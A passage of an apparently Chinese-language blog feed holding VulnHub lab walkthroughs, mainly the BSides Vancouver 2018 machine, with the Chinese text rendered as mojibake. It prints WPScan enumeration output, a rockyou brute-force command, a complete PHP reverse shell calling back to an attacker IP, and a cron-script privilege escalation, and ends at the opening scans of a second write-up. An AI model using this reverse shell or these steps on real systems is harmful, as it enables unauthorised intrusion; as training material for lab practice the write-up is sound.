bash">â”Œâ”€â”€(rightevilã‰¿kali)-[~/Desktop/besides]<br>â””â”€$ wpscan -e vp,vt,u --url http://192.168.233.114/backup_wordpress/<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.24</span><br><span class="hljs-string">       Sponsored by Automattic - https://automattic.com/</span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] It seems like you have not updated the database for some time.</span><br><span class="hljs-string">[?] Do you want to update now? [Y]es [N]o, default: [N]n</span><br><span class="hljs-string">[+] URL: http://192.168.233.114/backup_wordpress/ [192.168.233.114]</span><br><span class="hljs-string">[+] Started: Fri Dec 15 22:53:17 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">Interesting Finding(s):</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Headers</span><br><span class="hljs-string"> | Interesting Entries:</span><br><span class="hljs-string"> |  - Server: Apache/2.2.22 (Ubuntu)</span><br><span class="hljs-string"> |  - X-Powered-By: PHP/5.3.10-1ubuntu3.26</span><br><span class="hljs-string"> | Found By: Headers (Passive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://192.168.233.114/backup_wordpress/xmlrpc.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://192.168.233.114/backup_wordpress/readme.html</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Upload directory has listing enabled: http://192.168.233.114/backup_wordpress/wp-content/uploads/</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://192.168.233.114/backup_wordpress/wp-cron.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 60%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 4.5 identified (Insecure, released on 2016-04-12).</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  - http://192.168.233.114/backup_wordpress/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.5&lt;/generator&gt;</span><br><span class="hljs-string"> |  - http://192.168.233.114/backup_wordpress/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.5&lt;/generator&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress theme in use: twentysixteen</span><br><span class="hljs-string"> | Location: http://192.168.233.114/backup_wordpress/wp-content/themes/twentysixteen/</span><br><span class="hljs-string"> | Last Updated: 2023-11-07T00:00:00.000Z</span><br><span class="hljs-string"> | Readme: http://192.168.233.114/backup_wordpress/wp-content/themes/twentysixteen/readme.txt</span><br><span class="hljs-string"> | [!] The version is out of date, the latest version is 3.1</span><br><span class="hljs-string"> | Style URL: http://192.168.233.114/backup_wordpress/wp-content/themes/twentysixteen/style.css?ver=4.5</span><br><span class="hljs-string"> | Style Name: Twenty Sixteen</span><br><span class="hljs-string"> | Style URI: https://wordpress.org/themes/twentysixteen/</span><br><span class="hljs-string"> | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout â€” the horizontal masthead ...</span><br><span class="hljs-string"> | Author: the WordPress team</span><br><span class="hljs-string"> | Author URI: https://wordpress.org/</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Version: 1.2 (80% confidence)</span><br><span class="hljs-string"> | Found By: Style (Passive Detection)</span><br><span class="hljs-string"> |  - http://192.168.233.114/backup_wordpress/wp-content/themes/twentysixteen/style.css?ver=4.5, Match: &#x27;</span>Version: 1.2<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No plugins Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Known Locations - Time: 00:00:00 &lt;====================&gt; (630 / 630) 100.00% Time: 00:00:00</span><br><span class="hljs-string">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No themes Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Brute Forcing Author IDs - Time: 00:00:01 &lt;======================&gt; (10 / 10) 100.00% Time: 00:00:01</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] User(s) Identified:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] john</span><br><span class="hljs-string"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="hljs-string"> | Confirmed By:</span><br><span class="hljs-string"> |  Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> |  Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] admin</span><br><span class="hljs-string"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="hljs-string"> | Confirmed By:</span><br><span class="hljs-string"> |  Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> |  Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Fri Dec 15 22:53:24 2023</span><br><span class="hljs-string">[+] Requests Done: 687</span><br><span class="hljs-string">[+] Cached Requests: 9</span><br><span class="hljs-string">[+] Data Sent: 204.73 KB</span><br><span class="hljs-string">[+] Data Received: 456.144 KB</span><br><span class="hljs-string">[+] Memory used: 271.453 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:00:06</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªjohnç”¨æˆ·å’Œadminç”¨æˆ·ï¼Œæˆ‘ä»¬ä»ftpä¸Šä¸‹è½½çš„ç”¨æˆ·åˆ—è¡¨ä¸­ä¹Ÿæœ‰johnç”¨æˆ·<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d01553cba4c396d0cfc08.png"></p><p>é€šå¸¸adminç”¨æˆ·éš¾ä»¥çˆ†ç ´ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä»¥ä¸€ä¸‹çˆ†ç ´johnç”¨æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://192.168.233.114/backup_wordpress/ -U john -P /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><ul><li><code>-U</code> æŒ‡å®šç”¨æˆ·æˆ–è€…ç”¨æˆ·åˆ—è¡¨æ–‡ä»¶</li><li><code>-P</code> æŒ‡å®šå¯†ç å­—å…¸<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e5f045f24d945680d388f.png"></li></ul><h1 id="ğŸšªğŸš¶-è·å–æƒé™"><a href="#ğŸšªğŸš¶-è·å–æƒé™" class="headerlink" title="ğŸšªğŸš¶ è·å–æƒé™"></a>ğŸšªğŸš¶ è·å–æƒé™</h1><p>æˆ‘ä»¬ç™»å½•ä¸Šåå‘ç°johnåŒæ ·æ˜¯ä¸€ä¸ªadministratorç”¨æˆ·ï¼Œé‚£è¿™æ ·æˆ‘ä»¬ä¾¿å¯¹ä¸€ä¸ªé¡µé¢è¿›è¡Œä¿®æ”¹ï¼Œæ’å…¥åå¼¹shellè¯­å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="hljs-comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="hljs-title function_ invoke__">set_time_limit</span> (<span class="hljs-number">0</span>);<br><span class="hljs-variable">$VERSION</span> = <span class="hljs-string">&quot;1.0&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;192.168.233.130&#x27;</span>;  <span class="hljs-comment">// You have changed this</span><br><span class="hljs-variable">$port</span> = <span class="hljs-number">443</span>;  <span class="hljs-comment">// And this</span><br><span class="hljs-variable">$chunk_size</span> = <span class="hljs-number">1400</span>;<br><span class="hljs-variable">$write_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$error_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;<br><span class="hljs-variable">$daemon</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$debug</span> = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Daemonise ourself if possible to avoid zombies later</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="hljs-comment">// our php process and avoid zombies.  Worth a try...</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;pcntl_fork&#x27;</span>)) &#123;<br><span class="hljs-comment">// Fork and have the parent process exit</span><br><span class="hljs-variable">$pid</span> = <span class="hljs-title function_ invoke__">pcntl_fork</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t fork&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Parent exits</span><br>&#125;<br><span class="hljs-comment">// Make the current process a session leader</span><br><span class="hljs-comment">// Will only succeed if we forked</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">posix_setsid</span>() == -<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Error: Can&#x27;t setsid()&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-variable">$daemon</span> = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);<br>&#125;<br><span class="hljs-comment">// Change to a safe directory</span><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-comment">// Remove any umask we inherited</span><br><span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Do the reverse shell...</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Open reverse connection</span><br><span class="hljs-variable">$sock</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123;<br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&quot;</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">// Spawn shell process</span><br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  <span class="hljs-comment">// stdin is a pipe that the child will read from</span><br><span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  <span class="hljs-comment">// stdout is a pipe that the child will write to</span><br><span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)   <span class="hljs-comment">// stderr is a pipe that the child will write to</span><br>);<br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) &#123;<br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">// Set everything to non-blocking</span><br><span class="hljs-comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span><br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Successfully opened reverse shell to <span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>&quot;</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">// Check for end of TCP connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$sock</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell connection terminated&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// Check for end of STDOUT</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell process terminated&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// Wait until a command is end down $sock, or some</span><br><span class="hljs-comment">// command output is available on STDOUT or STDERR</span><br><span class="hljs-variable">$read_a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-variable">$num_changed_sockets</span> = <span class="hljs-title function_ invoke__">stream_select</span>(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">// If we can read from the TCP socket, send</span><br><span class="hljs-comment">// data to process&#x27;s STDIN</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK READ&quot;</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK: <span class="hljs-subst">$input</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$input</span>);&#125;<br><span class="hljs-comment">// If we can read from the process&#x27;s STDOUT</span><br><span class="hljs-comment">// send data down tcp connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT READ&quot;</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$chunk_size</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT: <span class="hljs-subst">$input</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);&#125;<br><span class="hljs-comment">// If we can read from the process&#x27;s STDERR</span><br><span class="hljs-comment">// send data down tcp connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR READ&quot;</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$chunk_size</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR: <span class="hljs-subst">$input</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$sock</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><span class="hljs-comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span><br><span class="hljs-comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printit</span> (<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$string</span>&quot;</span>;&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯æˆ‘ç”¨æµè§ˆå™¨çš„<code>Hack-Tools</code>æ’ä»¶ç”Ÿæˆçš„åå¼¹shellçš„ä»£ç ï¼Œè¿™ä¸ªæ’ä»¶æåŠ›æ¨èï¼Œéå¸¸å€¼å¾—ä½¿ç”¨ï¼ŒåŠŸèƒ½éå¸¸å¤š<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1249697e28c63b9efb401.png"><br>æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸ªé¡µé¢ä»£ç ï¼Œç„¶åä¿å­˜ï¼Œåœ¨æœ¬åœ°ç›‘å¬ä¹‹åå»ç‚¹å‡»è¿™ä¸ªé¡µé¢åå¼¹shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/cdefe4ef83bea633783bd.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a8c8072f4a1bc2662f47e.png"></p><h1 id="ğŸ›¡ï¸-æå‡æƒé™"><a href="#ğŸ›¡ï¸-æå‡æƒé™" class="headerlink" title="ğŸ›¡ï¸ æå‡æƒé™"></a>ğŸ›¡ï¸ æå‡æƒé™</h1><p>åå¼¹åˆ°shellåä¸Šä¼ æˆ‘ä»¬çš„è¾…åŠ©ææƒè„šæœ¬å¹¶æ‰§è¡Œï¼Œç„¶åæ‰¾åˆ°ä¸€ä¸ªæˆ‘ä»¬å¯å†™çš„æ–‡ä»¶ï¼Œä¸”æ˜¯ç”±rootç”¨æˆ·è®¡åˆ’æ‰§è¡Œçš„ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b8237f35a9a13ce03254a.png"><br>æˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­æ’å…¥bashåå¼¹shellè¯­å¥<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/856478c182a28787d565d.png"><br>æœ¬æ¥ä¸€èˆ¬å‘½ä»¤è¡Œåé¢çš„bash -iå°±è¡Œäº†ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä½•ï¼Œæˆ‘åªç”¨bash -içš„è¯æ— æ³•åå¼¹åˆ°shellï¼Œåé¢åŠ äº†ä¸ªbash -cåå°±è¡Œäº†<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2f2bb349eecce1b6dfb66.png"></p><p>åé¢æŸ¥é˜…äº†èµ„æ–™å‘ç°æ˜¯è„šæœ¬é»˜è®¤çš„æ˜¯/bin/shï¼Œè€Œshå’Œbashæœ‰ä¸€å®šå·®è·ï¼Œshå¥½åƒä¹Ÿä¸æ”¯æŒ/dev/tcpè¿™æ ·å»å½¢æˆä¸€ä¸ªtcpè¿æ¥ï¼Œå¦‚æœæŠŠç¬¬ä¸€è¡Œçš„#!/bin/shæ”¹ä¸º#!/bin/bashåˆ™ä¸€åˆ‡å®‰å¥½</p><h1 id="ğŸ“–-æ¨èæ–‡ç« "><a href="#ğŸ“–-æ¨èæ–‡ç« " class="headerlink" title="ğŸ“– æ¨èæ–‡ç« "></a>ğŸ“– æ¨èæ–‡ç« </h1><p><a href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/">BsidesVancouverä¸‹è½½é“¾æ¥</a><br><a href="https://github.com/LasCC/Hack-Tools">Hack-Toolsæ’ä»¶é¡¹ç›®åœ°å€</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp Bob 1.0.1</title>
    <link href="/vulnhub-wp-Bob-1-0-1/"/>
    <url>/vulnhub-wp-Bob-1-0-1/</url>
    
    <content type="html"><![CDATA[<h1 id="ğŸ–³-ä¸»æœºå‘ç°"><a href="#ğŸ–³-ä¸»æœºå‘ç°" class="headerlink" title="ğŸ–³ ä¸»æœºå‘ç°"></a>ğŸ–³ ä¸»æœºå‘ç°</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.234.0/24<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a5481d6693dcb9790d551.png"><br>ç›®æ ‡æœºå™¨æ˜¯:<strong>192.168.234.47</strong></p><h1 id="ğŸ‘-æœåŠ¡æ‰«æ"><a href="#ğŸ‘-æœåŠ¡æ‰«æ" class="headerlink" title="ğŸ‘ æœåŠ¡æ‰«æ"></a>ğŸ‘ æœåŠ¡æ‰«æ</h1><p>nmapå¸¸è§„æ‰«æç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€$ sudo nmap -p- -sV 192.168.234.47 --min-rate 10000<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 15:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> bogon (192.168.234.47)<br>Host is up (0.000077s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT      STATE SERVICE 